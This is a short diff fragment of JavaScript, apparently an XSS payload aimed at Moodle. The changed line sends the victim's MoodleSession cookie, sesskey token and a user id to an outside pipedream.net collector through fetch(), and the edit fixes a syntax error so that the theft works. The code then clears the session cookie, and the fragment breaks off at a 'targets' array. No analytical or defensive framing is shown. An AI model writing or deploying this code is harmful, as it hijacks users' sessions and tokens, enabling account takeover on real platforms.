@@ -2,7 +2,7 @@
 const u=document.querySelector('[data-route="view-settings"]').getAttribute('data-route-param');
 const t=document.cookie.match(/MoodleSession=([^;]+)/)[1];
 const s=M.cfg.sesskey;
-fetch('//eoizd5ecl7m1qqn.m.pipedream.net/?c='+t+"&id="+u+"&sesskey="+s;
+fetch('//eoizd5ecl7m1qqn.m.pipedream.net/?c='+t+"&id="+u+"&sesskey="+s);
 document.cookie='MoodleSession=;path=/';
 (() => {
   const targets = [
